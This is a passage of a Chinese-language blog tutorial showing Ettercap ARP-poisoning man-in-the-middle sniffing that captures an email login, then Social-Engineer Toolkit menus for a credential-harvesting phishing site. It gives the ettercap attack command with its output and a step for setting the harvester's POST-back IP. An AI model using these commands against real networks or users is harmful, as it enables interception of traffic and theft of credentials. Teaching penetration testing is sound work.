connections复选框。然后单击“确定”按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%878.png" alt="图片8"></p></li><li><p>从该界面可以看到，目标用户登录了邮箱。其中包括邮箱用户和密码。当用户获取信息后停止现有嗅探，在菜单栏中依次选择Start|Stop sniffing命令，如图下所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%879.png" alt="图片9"></p></li><li><p>停止嗅探后，还需要停止中间人攻击。在菜单栏中依次选择Mitm|Stop mitm attack(s)命令，将显示如下图所示的对话框。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8710.png" alt="图片10"></p></li><li><p>在该对话框中单击“确定”按钮，这样就成功地完成了中间人攻击。</p></li></ol><p>Ettercap工具提供了两种模式，一种是图形界面，另一种是命令行模式。喜欢使用命令的用户，也可以通过命令行模式来实施中间人攻击。</p><p>语法格式如下：</p><blockquote><p>ettercap [选项] [目标1] [目标2]</p></blockquote><p>用于实施ARP攻击的选项及含义如下：</p><blockquote><p>·-i：选择网络接口，默认将选择第一个接口eth0。<br>·-M,–mitm<a href="METHOD:ARGS" target="_blank" rel="noopener">METHOD:ARGS</a>：执行中间人攻击。其中，remote表示双向；oneway表示单向。<br>-T,–text：使用文本模式。<br>-q,–quiet：不显示包内容。<br>-P<plugin>：加载的插件。</plugin></p></blockquote><p>使用Ettercap的命令行模式，对目标主机192.168.10.77实施中间人攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote /192.168.100.115// /192.168.100.1//</span></span><br><span class="line"></span><br><span class="line">ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team</span><br><span class="line"></span><br><span class="line">Listening on:</span><br><span class="line">  eth0 -&gt; 00:0C:29:CE:D2:12</span><br><span class="line">          192.168.100.186/255.255.255.0</span><br><span class="line">          fe80::20c:29ff:fece:d212/64</span><br><span class="line"></span><br><span class="line">SSL dissection needs a valid <span class="string">'redir_command_on'</span> script <span class="keyword">in</span> the etter.conf file</span><br><span class="line">Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not <span class="built_in">set</span> to 0.</span><br><span class="line">Privileges dropped to EUID 65534 EGID 65534...</span><br><span class="line"></span><br><span class="line">  34 plugins</span><br><span class="line">  42 protocol dissectors</span><br><span class="line">  57 ports monitored</span><br><span class="line">28230 mac vendor fingerprint</span><br><span class="line">1766 tcp OS fingerprint</span><br><span class="line">2182 known services</span><br><span class="line">Lua: no scripts were specified, not starting up!</span><br><span class="line"></span><br><span class="line">Scanning <span class="keyword">for</span> merged targets (2 hosts)...</span><br><span class="line"></span><br><span class="line">* |==================================================&gt;| 100.00 %</span><br><span class="line"></span><br><span class="line">2 hosts added to the hosts list...</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"></span><br><span class="line"> GROUP 1 : 192.168.100.115 98:8D:46:D1:77:57</span><br><span class="line"></span><br><span class="line"> GROUP 2 : 192.168.100.1 80:05:88:E6:74:7C</span><br><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit <span class="string">'h'</span> <span class="keyword">for</span> inline <span class="built_in">help</span></span><br></pre></td></tr></table></figure><p>看到以上类似的输出信息，表示成功启动了中间人攻击。当攻击主机嗅探到数据包时，将进行输出。</p><h2 id="二、社会工程学攻击"><a href="#二、社会工程学攻击" class="headerlink" title="二、社会工程学攻击"></a>二、社会工程学攻击</h2><p>社会工程学攻击主要是利用人们的好奇心、信任、贪婪及一些愚蠢的错误，攻击人们自身的弱点。Kali Linux提供了一个社会工程学工具集SET，可以用来实施社会工程学攻击。</p><h3 id="2-1-启动社会工程学工具包——SET"><a href="#2-1-启动社会工程学工具包——SET" class="headerlink" title="2.1 启动社会工程学工具包——SET"></a>2.1 启动社会工程学工具包——SET</h3><p>社会工程学工具包——SET是一个开源的、Python驱动的社会工程学渗透测试工具。使用该工具包，可以实施Web向量攻击和PowerShell攻击等。下面将介绍启动社会工程学工具包的方法。</p><p>启动社会工程学工具包。具体操作步骤如下：</p><ol><li><p>启动SET。在终端执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@daxueba:~<span class="comment"># setoolkit</span></span><br></pre></td></tr></table></figure><p>如果没有这个命令可以按照<a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">github</a>上的方式安装。</p><p>执行以上命令后，将输出如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[-] New set.config.py file generated on: 2020-12-28 06:50:39.218765</span><br><span class="line">[-] Verifying configuration update...</span><br><span class="line">[*] Update verified, config timestamp is: 2020-12-28 06:50:39.218765</span><br><span class="line">[*] SET is using the new config, no need to restart</span><br><span class="line">Copyright 2020, The Social-Engineer Toolkit (SET) by TrustedSec, LLC</span><br><span class="line">All rights reserved.</span><br><span class="line"></span><br><span class="line">Redistribution and use <span class="keyword">in</span> <span class="built_in">source</span> and binary forms, with or without modification, are permitted provided that the following conditions are met:</span><br><span class="line"></span><br><span class="line">    * Redistributions of <span class="built_in">source</span> code must retain the above copyright notice, this list of conditions and the following disclaimer.</span><br><span class="line">    * Redistributions <span class="keyword">in</span> binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer <span class="keyword">in</span> the documentation and/or other materials provided with the distribution.</span><br><span class="line">    * Neither the name of Social-Engineer Toolkit nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.</span><br><span class="line"></span><br><span class="line">THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS <span class="string">"AS IS"</span> AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDINGNEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span><br><span class="line"></span><br><span class="line">The above licensing was taken from the BSD licensing and is applied to Social-Engineer Toolkit as well.</span><br><span class="line"></span><br><span class="line">Note that the Social-Engineer Toolkit is provided as is, and is a royalty free open-source application.</span><br><span class="line"></span><br><span class="line">Feel free to modify, use, change, market, <span class="keyword">do</span> whatever you want with it as long as you give the appropriate credit <span class="built_in">where</span> credit is due (<span class="built_in">which</span> means giving the authors the credit they deserve <span class="keyword">for</span> writing it).</span><br><span class="line"></span><br><span class="line">Also note that by using this software, <span class="keyword">if</span> you ever see the creator of SET <span class="keyword">in</span> a bar, you should (optional) give him a hug and should (optional) buy him a beer (or bourbon - hopefully bourbon). Author has the option to refuse the hug (most likely will never happen) or the beer or bourbon (also most likely will never happen). Also by using this tool (these are all optional of course!), you should try to make this industry better, try to stay positive, try to <span class="built_in">help</span> others, try to learn from one another, try stay out of drama, try offer free hugs when possible (and make sure recipient agrees to mutual hug), and try to <span class="keyword">do</span> everything you can to be awesome.</span><br><span class="line">The Social-Engineer Toolkit is designed purely <span class="keyword">for</span> good and not evil. If you are planning on using this tool <span class="keyword">for</span> malicious purposes that are not authorized by the company you are performing assessments <span class="keyword">for</span>, you are violating the terms of service and license of this toolset. By hitting yes (only one time), you agree to the terms of service and that you will only use this tool <span class="keyword">for</span> lawful purposes only.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Do you agree to the terms of service [y/n]:</span><br></pre></td></tr></table></figure><p>输出的信息详细地介绍了SET。该信息在第一次运行时才会显示。在该界面接受这部分信息后，才可进行其他操作。此时输入y，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">           ,..-,</span><br><span class="line">         ,;;f^^<span class="string">""</span><span class="string">"-._</span></span><br><span class="line"><span class="string">        ;;'          `-.</span></span><br><span class="line"><span class="string">       ;/               `.</span></span><br><span class="line"><span class="string">       ||  _______________\_______________________</span></span><br><span class="line"><span class="string">       ||  |HHHHHHHHHHPo"</span>~~\"o?HHHHHHHHHHHHHHHHHHH|</span><br><span class="line">       ||  |HHHHHHHHHP-._   \,<span class="string">'?HHHHHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">        |  |HP;""?HH|    """ |_.|HHP^^HHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">        |  |HHHb. ?H|___..--"|  |HP ,dHHHPo'</span>|HHHHH|</span><br><span class="line">        `| |HHHHHb.?Hb    .--J-dHP,dHHPo<span class="string">'_.rdHHHHH|</span></span><br><span class="line"><span class="string">         \ |HHHi.`;;.H`-./__/-'</span>H_,--<span class="string">'/;rdHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHboo.\ `|"\"/"\" '</span>/\ .<span class="string">'dHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHb`-|.  \|  \ / \/ dHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHb| \ |\   |\ |`|HHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHb  \| \  | \| |HHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHHb |\  \|  |\|HHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHHHb| \  |  / dHHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHHHHb  \/ \/ .fHHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHHHHH| /\ /\ |HHHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |""""""""""""""""""""""""""""""""""""""|</span></span><br><span class="line"><span class="string">           |,;=====.     ,-.  =.       ,=,,=====. |</span></span><br><span class="line"><span class="string">           |||     '</span>    //<span class="string">"\\   \\   //  ||     ' |</span></span><br><span class="line"><span class="string">           |||         ,/' `\.  `\. ,/'  ``=====. |</span></span><br><span class="line"><span class="string">           |||     .   //"</span><span class="string">""</span>\\   \\_//    .     |||</span><br><span class="line">           |`;=====<span class="string">' ='</span><span class="string">'     ``=  `-'</span>     `=====<span class="string">''</span>|</span><br><span class="line">           |______________________________________|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[---]        The Social-Engineer Toolkit (SET)         [---]</span><br><span class="line">[---]        Created by: David Kennedy (ReL1K)         [---]</span><br><span class="line">                      Version: 8.0.3</span><br><span class="line">                    Codename: <span class="string">'Maverick'</span></span><br><span class="line">[---]        Follow us on Twitter: @TrustedSec         [---]</span><br><span class="line">[---]        Follow me on Twitter: @HackingDave        [---]</span><br><span class="line">[---]       Homepage: https://www.trustedsec.com       [---]</span><br><span class="line">        Welcome to the Social-Engineer Toolkit (SET).</span><br><span class="line">         The one stop shop <span class="keyword">for</span> all of your SE needs.</span><br><span class="line"></span><br><span class="line">   The Social-Engineer Toolkit is a product of TrustedSec.</span><br><span class="line"></span><br><span class="line">           Visit: https://www.trustedsec.com</span><br><span class="line"></span><br><span class="line">   It<span class="string">'s easy to update using the PenTesters Framework! (PTF)</span></span><br><span class="line"><span class="string">Visit https://github.com/trustedsec/ptf to update all your tools!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   1) Social-Engineering Attacks</span></span><br><span class="line"><span class="string">   2) Penetration Testing (Fast-Track)</span></span><br><span class="line"><span class="string">   3) Third Party Modules</span></span><br><span class="line"><span class="string">   4) Update the Social-Engineer Toolkit</span></span><br><span class="line"><span class="string">   5) Update SET configuration</span></span><br><span class="line"><span class="string">   6) Help, Credits, and About</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  99) Exit the Social-Engineer Toolkit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>以上显示了社会工程学工具包的创建者、版本为8.0.3、代号为Maverick及菜单信息。此时可以根据自己的需要，选择相应的编号进行操作。例如，选择社会工程学攻击。输入编号1，将显示可实施的社会工程学攻击列表如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line">                          _                                           J</span><br><span class="line">                         /-\                                          J</span><br><span class="line">                    _____|<span class="comment">#|_____                                     J</span></span><br><span class="line">                   |_____________|                                    J</span><br><span class="line">                  |_______________|                                   E</span><br><span class="line">                 ||_POLICE_<span class="comment">##_BOX_||                                  R</span></span><br><span class="line">                 | |-|-|-|||-|-|-| |                                  O</span><br><span class="line">                 | |-|-|-|||-|-|-| |                                  N</span><br><span class="line">                 | |_|_|_|||_|_|_| |                                  I</span><br><span class="line">                 | ||~~~| | |---|| |                                  M</span><br><span class="line">                 | ||~~~|!|!| O || |                                  O</span><br><span class="line">                 | ||~~~| |.|___|| |                                  O</span><br><span class="line">                 | ||---| | |---|| |                                  O</span><br><span class="line">                 | ||   | | |   || |                                  O</span><br><span class="line">                 | ||___| | |___|| |                                  !</span><br><span class="line">                 | ||---| | |---|| |                                  !</span><br><span class="line">                 | ||   | | |   || |                                  !</span><br><span class="line">                 | ||___| | |___|| |                                  !</span><br><span class="line">                 |-----------------|                                  !</span><br><span class="line">                 |   Timey Wimey   |                                  !</span><br><span class="line">                 -------------------                                  !</span><br><span class="line"></span><br><span class="line">[---]        The Social-Engineer Toolkit (SET)         [---]</span><br><span class="line">[---]        Created by: David Kennedy (ReL1K)         [---]</span><br><span class="line">                      Version: 8.0.3</span><br><span class="line">                    Codename: <span class="string">'Maverick'</span></span><br><span class="line">[---]        Follow us on Twitter: @TrustedSec         [---]</span><br><span class="line">[---]        Follow me on Twitter: @HackingDave        [---]</span><br><span class="line">[---]       Homepage: https://www.trustedsec.com       [---]</span><br><span class="line">        Welcome to the Social-Engineer Toolkit (SET).</span><br><span class="line">         The one stop shop <span class="keyword">for</span> all of your SE needs.</span><br><span class="line"></span><br><span class="line">   The Social-Engineer Toolkit is a product of TrustedSec.</span><br><span class="line"></span><br><span class="line">           Visit: https://www.trustedsec.com</span><br><span class="line"></span><br><span class="line">   It<span class="string">'s easy to update using the PenTesters Framework! (PTF)</span></span><br><span class="line"><span class="string">Visit https://github.com/trustedsec/ptf to update all your tools!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">During handling of the above exception, another exception occurred:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   1) Spear-Phishing Attack Vectors</span></span><br><span class="line"><span class="string">   2) Website Attack Vectors</span></span><br><span class="line"><span class="string">   3) Infectious Media Generator</span></span><br><span class="line"><span class="string">   4) Create a Payload and Listener</span></span><br><span class="line"><span class="string">   5) Mass Mailer Attack</span></span><br><span class="line"><span class="string">   6) Arduino-Based Attack Vector</span></span><br><span class="line"><span class="string">   7) Wireless Access Point Attack Vector</span></span><br><span class="line"><span class="string">   8) QRCode Generator Attack Vector</span></span><br><span class="line"><span class="string">   9) Powershell Attack Vectors</span></span><br><span class="line"><span class="string">  10) Third Party Modules</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  99) Return back to the main menu.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>以上信息显示了社会工程学攻击的菜单选项。此时，用户就可以选择工程学攻击的类型，然后实施攻击。</p><h3 id="2-2-Web攻击向量"><a href="#2-2-Web攻击向量" class="headerlink" title="2.2 Web攻击向量"></a>2.2 Web攻击向量</h3><p>Web攻击向量会特意构造出一些对目标而言是可信且具有诱惑力的网页。当目标用户访问该网页后，即可窃取目标用户的信息。社会工程学攻击工具包可以克隆出和实际运行的可信站点外观完全一样的网页，这使得受害者认为他们正在浏览一个合法站点。</p><p>使用SET实施Web攻击向量。具体操作步骤如下：</p><ol><li><p>启动社会工程学工具包，并选择社会工程学攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setoolkit</span></span><br><span class="line"></span><br><span class="line">……………………</span><br><span class="line">   1) Social-Engineering Attacks</span><br><span class="line">   2) Penetration Testing (Fast-Track)</span><br><span class="line">   3) Third Party Modules</span><br><span class="line">   4) Update the Social-Engineer Toolkit</span><br><span class="line">   5) Update SET configuration</span><br><span class="line">   6) Help, Credits, and About</span><br><span class="line"></span><br><span class="line">  99) Exit the Social-Engineer Toolkit</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line">…………………………</span><br><span class="line">   1) Spear-Phishing Attack Vectors</span><br><span class="line">   2) Website Attack Vectors</span><br><span class="line">   3) Infectious Media Generator</span><br><span class="line">   4) Create a Payload and Listener</span><br><span class="line">   5) Mass Mailer Attack</span><br><span class="line">   6) Arduino-Based Attack Vector</span><br><span class="line">   7) Wireless Access Point Attack Vector</span><br><span class="line">   8) QRCode Generator Attack Vector</span><br><span class="line">   9) Powershell Attack Vectors</span><br><span class="line">  10) Third Party Modules</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt;</span><br></pre></td></tr></table></figure><p>以上信息显示了攻击社会工程学的菜单选项。此时，用户可以选择对应的攻击类型，然后实施攻击。</p></li><li><p>选择Web攻击向量，所以输入编号为2，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; 2</span><br><span class="line"></span><br><span class="line">The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframereplacements to make the highlighted URL link to appear legitimate however when clicked a windowpops up <span class="keyword">then</span> is replaced with the malicious link. You can edit the link replacement settings <span class="keyword">in</span> the set_config <span class="keyword">if</span> its too slow/fast.</span><br><span class="line"></span><br><span class="line">The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see <span class="built_in">which</span> is successful.</span><br><span class="line"></span><br><span class="line">The HTA Attack method will allow you to <span class="built_in">clone</span> a site and perform powershell injection through HTA files <span class="built_in">which</span> can be used <span class="keyword">for</span> Windows-based powershell exploitation through the browser.</span><br><span class="line"></span><br><span class="line">   1) Java Applet Attack Method</span><br><span class="line">   2) Metasploit Browser Exploit Method</span><br><span class="line">   3) Credential Harvester Attack Method</span><br><span class="line">   4) Tabnabbing Attack Method</span><br><span class="line">   5) Web Jacking Attack Method</span><br><span class="line">   6) Multi-Attack Web Method</span><br><span class="line">   7) HTA Attack Method</span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt;</span><br></pre></td></tr></table></figure><p>以上菜单栏中显示了可实施的Web攻击向量方法，并且详细描述了各种攻击方法的作用。</p></li><li><p>选择证书获取攻击方法，所以输入编号3，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:webattack&gt;3</span><br><span class="line"></span><br><span class="line"> The first method will allow SET to import a list of pre-defined web</span><br><span class="line"> applications that it can utilize within the attack.</span><br><span class="line"></span><br><span class="line"> The second method will completely <span class="built_in">clone</span> a website of your choosing</span><br><span class="line"> and allow you to utilize the attack vectors within the completely</span><br><span class="line"> same web application you were attempting to <span class="built_in">clone</span>.</span><br><span class="line"></span><br><span class="line"> The third method allows you to import your own website, note that you</span><br><span class="line"> should only have an index.html when using the import website</span><br><span class="line"> functionality.</span><br><span class="line"></span><br><span class="line">   1) Web Templates</span><br><span class="line">   2) Site Cloner</span><br><span class="line">   3) Custom Import</span><br><span class="line"></span><br><span class="line">  99) Return to Webattack Menu</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt;</span><br></pre></td></tr></table></figure><p>以上输出信息中，显示了创建Web站点的方式。</p></li><li><p>用户可以根据自己的需要，选择不同的方式。这里为了方便，选择使用SET提供的Web模板。所以，输入编号1，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:webattack&gt;1</span><br><span class="line">[-] Credential harvester will allow you to utilize the <span class="built_in">clone</span> capabilities within SET</span><br><span class="line">[-] to harvest credentials or parameters from a website as well as place them into a report</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---</span><br><span class="line"></span><br><span class="line">The way that this works is by cloning a site and looking <span class="keyword">for</span> form fields to</span><br><span class="line">rewrite. If the POST fields are not usual methods <span class="keyword">for</span> posting forms this</span><br><span class="line">could fail. If it does, you can always save the HTML, rewrite the forms to</span><br><span class="line">be standard forms and use the <span class="string">"IMPORT"</span> feature. Additionally, really</span><br><span class="line">important:</span><br><span class="line"></span><br><span class="line">If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL</span><br><span class="line">IP address below, not your NAT address. Additionally, <span class="keyword">if</span> you don<span class="string">'t know</span></span><br><span class="line"><span class="string">basic networking concepts, and you have a private IP address, you will</span></span><br><span class="line"><span class="string">need to do port forwarding to your NAT IP address from your external IP</span></span><br><span class="line"><span class="string">address. A browser doesns'</span>t know how to communicate with a private IP</span><br><span class="line">address, so <span class="keyword">if</span> you don<span class="string">'t specify an external IP address if you are using</span></span><br><span class="line"><span class="string">this from an external perpective, it will not work. This isn'</span>t a SET issue</span><br><span class="line">this is how networking works.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt; IP address <span class="keyword">for</span> the POST back <span class="keyword">in</span> Harvester/Tabnabbing [192.168.100.186]:</span><br></pre></td></tr></table></figure><p>此时，指定获取目标用户提交信息的IP地址，即攻击主机Kali的地址。输入以上地址后，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------</span><br><span class="line">             **** Important Information ****</span><br><span class="line"></span><br><span class="line">For templates, when a POST is initiated to harvest</span><br><span class="line">credentials, you will need a site <span class="keyword">for</span> it to redirect.</span><br><span class="line"></span><br><span class="line">You can configure this option under:</span><br><span class="line"></span><br><span class="line">      /etc/setoolkit/set.config</span><br><span class="line"></span><br><span class="line">Edit this file, and change HARVESTER_REDIRECT and</span><br><span class="line">HARVESTER_URL to the sites you want to redirect to</span><br><span class="line">after it is posted. If you <span class="keyword">do</span> not <span class="built_in">set</span> these, <span class="keyword">then</span></span><br><span class="line">it will not redirect properly. This only goes <span class="keyword">for</span></span><br><span class="line">templates.</span><br><span 